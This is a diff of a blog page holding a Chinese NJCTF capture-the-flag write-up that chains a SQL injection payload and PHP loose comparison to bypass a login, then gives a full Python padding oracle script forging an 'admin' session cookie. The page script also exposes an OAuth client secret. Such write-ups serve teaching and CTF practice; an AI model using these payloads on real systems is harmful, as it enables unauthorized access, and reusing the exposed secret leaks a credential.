 <h2 id="SQL注入-弱类型比较绕过登录"><a href="#SQL注入-弱类型比较绕过登录" class="headerlink" title="SQL注入+弱类型比较绕过登录"></a>SQL注入+弱类型比较绕过登录</h2><p>查看程序代码，用户认证是通过比较<code>$password</code> == <code>$pass</code>是否相等，<code>$pass</code> 是用户输入的密码，用户可控；而<code>$password</code> 是经AES解密后的值， 而密文<code>$encrypted_pass</code>是从数据库中查询出来的，存在SQL注入，用户可控，然而由于不知道秘钥，也就无法控制解密后的明文。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($encrypted_pass, $pass)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    $encrypted_pass = base64_decode($encrypted_pass);</div><div class="line">    $iv = substr($encrypted_pass, <span class="number">0</span>, <span class="number">16</span>);</div><div class="line">    $cipher = substr($encrypted_pass, <span class="number">16</span>);</div><div class="line">    $password = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</div><div class="line">    <span class="keyword">return</span> $password == $pass;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($encrypted_pass, $pass)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $encrypted_pass = base64_decode($encrypted_pass);</span><br><span class="line">    $iv = substr($encrypted_pass, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">    $cipher = substr($encrypted_pass, <span class="number">16</span>);</span><br><span class="line">    $password = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    <span class="keyword">return</span> $password == $pass;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>查询<code>openssl_decrypt</code>函数，其返回结果解释如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">The decrypted string on success or FALSE on failure</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The decrypted string on success or FALSE on failure</span><br></pre></td></tr></table></figure>
 <p>解密成功返回解密字符串， 失败则返回<code>false</code>, 如果我们令解密失败返回<code>false</code>, 那么我们只需要<code>$pass=&#39;&#39;</code>或<code>$pass=&#39;0&#39;</code>, 即可利用弱类型比较通过用户认证。要让解密失败，只需令密文长度不满足分组长度要求即可。</p>
 <p>payload如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">username=-1&apos; union select 1,1 %23</div><div class="line">password=0</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=-1&apos; union select 1,1 %23</span><br><span class="line">password=0</span><br></pre></td></tr></table></figure>
 <p>获取Cookie:</p>
 <ul>
 <li><code>token=fxAXU2%2Fzw6PmPMm1TkAgRg%3D%3D</code></li>
 <li><code>ID=56mJDsCs%2BQQf%2B44j1et%2BrQ%3D%3D</code></li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">Set-Cookie: ID=56mJDsCs%2BQQf%2B44j1et%2BrQ%3D%3D</div><div class="line">Set-Cookie: token=fxAXU2%2Fzw6PmPMm1TkAgRg%3D%3D</div><div class="line">Content-Length: 155</div><div class="line"></div><div class="line">you are in!&lt;/br&gt;&lt;!doctype html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;&lt;title&gt;Login&lt;/title&gt;&lt;/head&gt;</div><div class="line">&lt;body&gt;Hello ~~~ ctfer! &lt;div&gt;&lt;a href=&quot;logout.php&quot;&gt;Log out&lt;/a&gt;&lt;/div&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: ID=56mJDsCs%2BQQf%2B44j1et%2BrQ%3D%3D</span><br><span class="line">Set-Cookie: token=fxAXU2%2Fzw6PmPMm1TkAgRg%3D%3D</span><br><span class="line">Content-Length: 155</span><br><span class="line"></span><br><span class="line">you are in!&lt;/br&gt;&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;Login&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;Hello ~~~ ctfer! &lt;div&gt;&lt;a href=&quot;logout.php&quot;&gt;Log out&lt;/a&gt;&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
 <h2 id="Padding-Oracle攻击位置cookie"><a href="#Padding-Oracle攻击位置cookie" class="headerlink" title="Padding Oracle攻击位置cookie"></a>Padding Oracle攻击位置cookie</h2><p>认证成功过后，就是利用Padding Oracle攻击获取<code>$_SESSION[&quot;id&quot;]</code>解密后的中间值value, 然后伪造IV, 使得 <code>IV XOR value = &#39;admin&#39; + string(0x11）* 11</code>, 即可。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="keyword">import</span> base64</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_xor</span><span class="params">(a, b)</span>:</span></div><div class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([chr(ord(i) ^ ord(j)) <span class="keyword">for</span> i, j <span class="keyword">in</span> zip(a, b)])</div><div class="line"></div><div class="line"></div><div class="line">base_url = <span class="string">"http://218.2.197.235:23737/index.php"</span></div><div class="line"></div><div class="line">cookies = &#123;</div><div class="line">    <span class="string">'token'</span>: <span class="string">''</span>,</div><div class="line">    <span class="string">'PHPSESSID'</span>: <span class="string">'9uq1qjbeunb085pacngnmhupp3'</span></div><div class="line">&#125;</div><div class="line"></div><div class="line">tmp_iv = <span class="string">'0'</span> * <span class="number">16</span></div><div class="line">tmp_ivs = list(tmp_iv)</div><div class="line"></div><div class="line"><span class="comment"># 中间值 [123, 216, 172, 195, 38, 202, 124, 77, 207, 192, 18, 77, 136, 98, 31]</span></div><div class="line">value = []</div><div class="line"></div><div class="line"><span class="comment"># 只能破解出value后15个字符</span></div><div class="line"><span class="keyword">for</span> flag <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">16</span>):</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</div><div class="line">        <span class="comment"># brute</span></div><div class="line">        tmp_ivs[<span class="number">15</span>-len(value)] = chr(i)</div><div class="line">        cookies[<span class="string">'token'</span>] = base64.b64encode(<span class="string">''</span>.join(tmp_ivs))</div><div class="line">        resp = requests.get(base_url, cookies=cookies,</div><div class="line">                            proxies=&#123;<span class="string">'http'</span>: <span class="string">'http://127.0.0.1:8080'</span>&#125;)</div><div class="line">        <span class="keyword">if</span> <span class="string">'ERROR'</span> <span class="keyword">not</span> <span class="keyword">in</span> resp.content:</div><div class="line">            value.append(flag ^ i)</div><div class="line">            <span class="comment"># 更改初始向量</span></div><div class="line">            tmp_iv = <span class="string">'0'</span> * (<span class="number">16</span>-len(value)) + <span class="string">''</span>.join(chr(value[i] ^ (flag+<span class="number">1</span>))</div><div class="line">                                        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(value)<span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>))</div><div class="line">            tmp_ivs = list(tmp_iv)</div><div class="line"></div><div class="line">            <span class="keyword">print</span> flag, i, value</div><div class="line">            <span class="keyword">break</span></div><div class="line">        <span class="keyword">if</span> i == <span class="number">255</span>:</div><div class="line">            <span class="keyword">print</span> resp.content</div><div class="line">            <span class="keyword">print</span> <span class="string">'error'</span></div><div class="line">            sys.exit(<span class="number">0</span>)</div><div class="line"></div><div class="line"><span class="comment"># 逆序</span></div><div class="line">value.reverse()</div><div class="line"></div><div class="line">fake_id = <span class="string">'admin'</span> + chr(<span class="number">11</span>) * <span class="number">11</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</div><div class="line">    <span class="comment"># 爆破value 第一个字符</span></div><div class="line">    value = chr(i) + <span class="string">''</span>.join(chr(v) <span class="keyword">for</span> v <span class="keyword">in</span> value)</div><div class="line">    iv = str_xor(value, fake_id)</div><div class="line">    cookies[<span class="string">'token'</span>] = base64.b64encode(iv)</div><div class="line">    resp = requests.get(base_url, cookies=cookies)</div><div class="line">    <span class="keyword">if</span> <span class="string">'ERROR'</span> <span class="keyword">not</span> <span class="keyword">in</span> resp.content <span class="keyword">and</span> len(resp.content) &gt; <span class="number">139</span>:</div><div class="line">        <span class="keyword">print</span> value</div><div class="line">        <span class="keyword">print</span> resp.content</div></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([chr(ord(i) ^ ord(j)) <span class="keyword">for</span> i, j <span class="keyword">in</span> zip(a, b)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base_url = <span class="string">"http://218.2.197.235:23737/index.php"</span></span><br><span class="line"></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">'token'</span>: <span class="string">''</span>,</span><br><span class="line">    <span class="string">'PHPSESSID'</span>: <span class="string">'9uq1qjbeunb085pacngnmhupp3'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tmp_iv = <span class="string">'0'</span> * <span class="number">16</span></span><br><span class="line">tmp_ivs = list(tmp_iv)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 中间值 [123, 216, 172, 195, 38, 202, 124, 77, 207, 192, 18, 77, 136, 98, 31]</span></span><br><span class="line">value = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只能破解出value后15个字符</span></span><br><span class="line"><span class="keyword">for</span> flag <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        <span class="comment"># brute</span></span><br><span class="line">        tmp_ivs[<span class="number">15</span>-len(value)] = chr(i)</span><br><span class="line">        cookies[<span class="string">'token'</span>] = base64.b64encode(<span class="string">''</span>.join(tmp_ivs))</span><br><span class="line">        resp = requests.get(base_url, cookies=cookies,</span><br><span class="line">                            proxies=&#123;<span class="string">'http'</span>: <span class="string">'http://127.0.0.1:8080'</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'ERROR'</span> <span class="keyword">not</span> <span class="keyword">in</span> resp.content:</span><br><span class="line">            value.append(flag ^ i)</span><br><span class="line">            <span class="comment"># 更改初始向量</span></span><br><span class="line">            tmp_iv = <span class="string">'0'</span> * (<span class="number">16</span>-len(value)) + <span class="string">''</span>.join(chr(value[i] ^ (flag+<span class="number">1</span>))</span><br><span class="line">                                        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(value)<span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>))</span><br><span class="line">            tmp_ivs = list(tmp_iv)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">print</span> flag, i, value</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">255</span>:</span><br><span class="line">            <span class="keyword">print</span> resp.content</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'error'</span></span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 逆序</span></span><br><span class="line">value.reverse()</span><br><span class="line"></span><br><span class="line">fake_id = <span class="string">'admin'</span> + chr(<span class="number">11</span>) * <span class="number">11</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    <span class="comment"># 爆破value 第一个字符</span></span><br><span class="line">    value = chr(i) + <span class="string">''</span>.join(chr(v) <span class="keyword">for</span> v <span class="keyword">in</span> value)</span><br><span class="line">    iv = str_xor(value, fake_id)</span><br><span class="line">    cookies[<span class="string">'token'</span>] = base64.b64encode(iv)</span><br><span class="line">    resp = requests.get(base_url, cookies=cookies)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'ERROR'</span> <span class="keyword">not</span> <span class="keyword">in</span> resp.content <span class="keyword">and</span> len(resp.content) &gt; <span class="number">139</span>:</span><br><span class="line">        <span class="keyword">print</span> value</span><br><span class="line">        <span class="keyword">print</span> resp.content</span><br></pre></td></tr></table></figure>
 <h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>openssl_encrypt() 函数 options参数为<code>OPENSSL_RAW_DATA</code>, 使用的是<code>PKCS7</code>填充模式</p>
 
       
     </div>
+    
+    
+    
 
-    <div>
-      
-        
+    
 
-      
-    </div>
+    
 
-    <div>
-      
-        
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    Ethan
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://www.beesfun.com/2017/03/12/NJCTF-Padding-Oracle攻击利用/" title="NJCTF Padding Oracle攻击利用">http://www.beesfun.com/2017/03/12/NJCTF-Padding-Oracle攻击利用/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
 
-      
-    </div>
-
+      </div>
+    
 
     <footer class="post-footer">
       
@@ -467,7 +489,7 @@
       
 
       
-        
+      
       
 
       
@@ -495,6 +517,10 @@
       
       
     </footer>
+  </div>
+  
+  
+  
   </article>
 
 
@@ -504,15 +530,22 @@
     </div>
   </div>
 
-          
+
           </div>
           
 
 
           
-  <div class="comments" id="comments">
-    
-  </div>
+
+  
+    <div class="comments" id="comments">
+      
+        <div id="gitment-container"></div>
+      
+    </div>
+
+  
+
 
 
         </div>
@@ -528,110 +561,116 @@
   </div>
 
   <aside id="sidebar" class="sidebar">
+    
     <div class="sidebar-inner">
 
       
 
       
         <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
             文章目录
           </li>
-          <li class="sidebar-nav-overview" data-target="site-overview">
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
             站点概览
           </li>
         </ul>
       
 
-      <section class="site-overview sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-          <img class="site-author-image" itemprop="image"
-               src="https://avatars3.githubusercontent.com/u/15061633"
-               alt="Ethan" />
-          <p class="site-author-name" itemprop="name">Ethan</p>
-           
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://avatars3.githubusercontent.com/u/15061633"
+                alt="Ethan" />
+            
+              <p class="site-author-name" itemprop="name">Ethan</p>
               <p class="site-description motion-element" itemprop="description">personal blog :)</p>
-          
-        </div>
-        <nav class="site-state motion-element">
-
-          
-            <div class="site-state-item site-state-posts">
-              <a href="/archives">
-                <span class="site-state-item-count">46</span>
-                <span class="site-state-item-name">日志</span>
-              </a>
-            </div>
-          
-
-          
-            
-            
-            <div class="site-state-item site-state-categories">
-              <a href="/categories/index.html">
-                <span class="site-state-item-count">14</span>
-                <span class="site-state-item-name">分类</span>
-              </a>
-            </div>
-          
-
-          
-            
-            
-            <div class="site-state-item site-state-tags">
-              <a href="/tags/index.html">
-                <span class="site-state-item-count">56</span>
-                <span class="site-state-item-name">标签</span>
-              </a>
-            </div>
-          
-
-        </nav>
-
-        
-
-        <div class="links-of-author motion-element">
-          
-            
-              <span class="links-of-author-item">
-                <a href="https://github.com/hxer/" target="_blank" title="GitHub">
-                  
-                    <i class="fa fa-fw fa-github"></i>
-                  
-                  GitHub
-                </a>
-              </span>
-            
-          
-        </div>
-
-        
-        
-
-        
-        
-          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
-            <div class="links-of-blogroll-title">
-              <i class="fa  fa-fw fa-globe"></i>
-              友链
-            </div>
-            <ul class="links-of-blogroll-list">
-              
-                <li class="links-of-blogroll-item">
-                  <a href="http://www.wupco.cn" title="wupco" target="_blank">wupco</a>
-                </li>
-              
-                <li class="links-of-blogroll-item">
-                  <a href="https://danaive.github.io" title="danlei" target="_blank">danlei</a>
-                </li>
-              
-            </ul>
           </div>
-        
 
-        
+          <nav class="site-state motion-element">
 
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">46</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
 
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">56</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/hxer/" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友链
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://badcode.cc/" title="badcode" target="_blank">badcode</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.wupco.cn" title="wupco" target="_blank">wupco</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://danaive.github.io" title="danlei" target="_blank">danlei</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
       </section>
 
       
@@ -664,30 +703,45 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright" >
-  
-  &copy;  2017 - 
-  <span itemprop="copyrightYear">2018</span>
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2018</span>
   <span class="with-love">
-    <i class="fa fa-heart"></i>
+    <i class="fa fa-user"></i>
   </span>
   <span class="author" itemprop="copyrightHolder">Ethan</span>
+
+  
 </div>
 
 
-<div class="powered-by">
-  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
-</div>
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
 
-<div class="theme-info">
-  主题 -
-  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
-    NexT.Pisces
-  </a>
-</div>
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
 
 
         
+
+
+
+
+  <script type="text/javascript">
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//tajs.qq.com/stats?sId=63078337";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
 
         
       </div>
@@ -699,7 +753,9 @@
         
       </div>
     
+
     
+
   </div>
 
   
@@ -723,59 +779,78 @@
 
 
 
-  
-  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
-
-  
-  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
-
-  
-  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
-
-  
-  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-
-  
-  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-
-  
-  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
 
 
-  
 
 
-  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
 
-  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
 
 
 
   
   
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
 
 
-  <script type="text/javascript" src="/js/src/affix.js?v=5.1.0"></script>
+  
 
-  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
 
 
 
   
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
 
 
 
   
 
 
-  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
 
 
 
   
-
 
 
   
@@ -801,161 +876,371 @@
 
 
 
-  
+
+
+<!-- LOCAL: You can save these files to your site and update links -->
+    
+        
+        <link rel="stylesheet" href="https://aimingoo.github.io/gitmint/style/default.css">
+        <script src="https://aimingoo.github.io/gitmint/dist/gitmint.browser.js"></script>
+    
+<!-- END LOCAL -->
+
+    
+
+    
+      <script type="text/javascript">
+      function renderGitment(){
+        var gitment = new Gitmint({
+            id: window.location.pathname, 
+            owner: 'hxer',
+            repo: 'hxer.github.io',
+            
+            lang: "" || navigator.language || navigator.systemLanguage || navigator.userLanguage,
+            
+            oauth: {
+            
+            
+                client_secret: '7147116f4ae9df31961313af13fad164bdbf0fe3',
+            
+                client_id: 'ac1236f9efefa7d5580f'
+            }});
+        gitment.render('gitment-container');
+      }
+
+      
+      renderGitment();
+      
+      </script>
+    
 
 
 
+
+
+
+
   
-  
+
   <script type="text/javascript">
     // Popup Window;
     var isfetched = false;
+    var isXml = true;
     // Search DB path;
     var search_path = "search.xml";
-    if (search_path.length == 0) {
+    if (search_path.length === 0) {
       search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
     }
     var path = "/" + search_path;
     // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
 
     function proceedsearch() {
       $("body")
         .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
         .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
       $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
     }
+
     // search function;
     var searchFunc = function(path, search_id, content_id) {
       'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
       $.ajax({
         url: path,
-        dataType: "xml",
+        dataType: isXml ? "xml" : "json",
         async: true,
-        success: function( xmlResponse ) {
+        success: function(res) {
           // get the contents from search data
           isfetched = true;
           $('.popup').detach().appendTo('.header-inner');
-          var datas = $( "entry", xmlResponse ).map(function() {
+          var datas = isXml ? $("entry", res).map(function() {
             return {
-              title: $( "title", this ).text(),
+              title: $("title", this).text(),
               content: $("content",this).text(),
-              url: $( "url" , this).text()
+              url: $("url" , this).text()
             };
-          }).get();
-          var $input = document.getElementById(search_id);
-          var $resultContent = document.getElementById(content_id);
-          $input.addEventListener('input', function(){
-            var matchcounts = 0;
-            var str='<ul class=\"search-result-list\">';
-            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
-            $resultContent.innerHTML = "";
-            if (this.value.trim().length > 1) {
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
               // perform local searching
               datas.forEach(function(data) {
                 var isMatch = false;
-                var content_index = [];
